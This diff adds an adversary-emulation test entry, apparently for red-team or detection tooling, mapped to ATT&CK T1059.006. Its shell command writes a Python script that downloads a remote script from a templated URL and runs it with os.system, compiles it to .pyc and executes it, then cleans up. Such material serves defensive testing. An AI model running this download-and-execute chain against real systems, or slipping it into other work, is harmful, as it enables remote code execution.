@@ -1,0 +1,27 @@
+- description: 'Create Python file (.py) then compile to binary (.pyc) that downloads
+    an external malicious script then executes locally using the supplied executor
+    and arguments
+
+    '
+  id: 00f4173f86eada9e665406c31a260f1b
+  name: Execute Python via Python executables
+  platforms:
+    linux:
+      sh:
+        cleanup: 'rm #{python_binary_name} #{python_script_name} #{payload_file_name}'
+        command: 'which_python=$(which python || which python3 || which python3.9
+          || which python2); echo ''import requests'' > #{python_script_name}; echo
+          ''import os'' >> #{python_script_name}; echo ''url = "#{script_url}"'' >>
+          #{python_script_name}; echo ''malicious_command = "#{executor} #{payload_file_name}
+          #{script_args}"'' >> #{python_script_name}; echo ''session = requests.session()''
+          >> #{python_script_name}; echo ''source = session.get(url).content'' >>
+          #{python_script_name}; echo ''fd = open("#{payload_file_name}", "wb+")''
+          >> #{python_script_name}; echo ''fd.write(source)'' >> #{python_script_name};
+          echo ''fd.close()'' >> #{python_script_name}; echo ''os.system(malicious_command)''
+          >> #{python_script_name}; $which_python -c ''import py_compile; py_compile.compile("#{python_script_name}",
+          "#{python_binary_name}")''; $which_python #{python_binary_name}'
+        payloads: []
+  tactic: execution
+  technique:
+    attack_id: T1059.006
+    name: 'Command and Scripting Interpreter: Python'
